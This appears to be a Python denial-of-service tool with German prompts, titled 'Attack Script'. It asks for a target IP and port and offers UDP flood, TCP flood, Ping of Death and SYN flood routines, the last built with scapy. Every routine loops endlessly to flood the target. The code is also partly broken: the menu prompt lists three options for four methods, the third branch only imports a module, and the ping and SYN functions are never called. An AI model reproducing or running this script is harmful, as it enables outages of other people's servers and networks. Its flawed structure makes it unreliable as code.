# -*- coding: utf-8 -*-
import os
import socket
import random
from datetime import datetime

# Code Time
now = datetime.now()

# Daten für Pakete
udp_bytes = random._urandom(1490)

# Begrüßung
os.system("clear")
os.system("figlet Attack Script")
print("Willkommen zum Angriffsskript!")
print("Bitte wählen Sie eine Angriffsmethode:")
print("1 - UDP Flood")
print("2 - TCP Flood")
print("3 - POD Flood")
print("4 - SYN Flood")

# Auswahl der Methode
method = input("Wähle die Angriffsmethode (1/2/3): ")
ip = input("Ziel-IP-Adresse: ")
port = int(input("Port (nur für UDP und TCP relevant, z. B. 80): "))

# Angriffsmethoden
if method == "1":
    # UDP Flood
    print("Starte UDP-Flood...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = 0
    while True:
        sock.sendto(udp_bytes, (ip, port))
        sent += 1
        port = port + 1 if port < 65534 else 1
        print(f"Gesendet {sent} Pakete an {ip} über Port {port}")

elif method == "2":
    # TCP Flood
    print("Starte TCP-Flood...")
    sent = 0
    try:
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                sock.settimeout(5)
                sock.connect((ip, port))
                sock.send(random._urandom(1024))
                sent += 1
                print(f"Gesendet {sent} TCP-Pakete an {ip} über Port {port}")
            except Exception as e:
                print(f"Verbindung fehlgeschlagen: {e}")
            finally:
                sock.close()
    except KeyboardInterrupt:
        print("TCP-Flood beendet.")

elif method == "3":
    # POD Flood
    import subprocess

def ping_of_death(ip):
    print("Starte Ping of Death...")
    try:
        while True:
            subprocess.run(["ping", "-s", "65507", ip], check=True)
    except KeyboardInterrupt:
        print("Ping of Death beendet.")
        
from scapy.all import *
#SYN Flood
def syn_flood(ip, port):
    print("Starte SYN-Flood...")
    try:
        while True:
            ip_layer = IP(dst=ip)
            tcp_layer = TCP(sport=RandShort(), dport=port, flags="S")
            packet = ip_layer / tcp_layer
            send(packet, verbose=False)
    except KeyboardInterrupt:
        print("SYN-Flood beendet.")
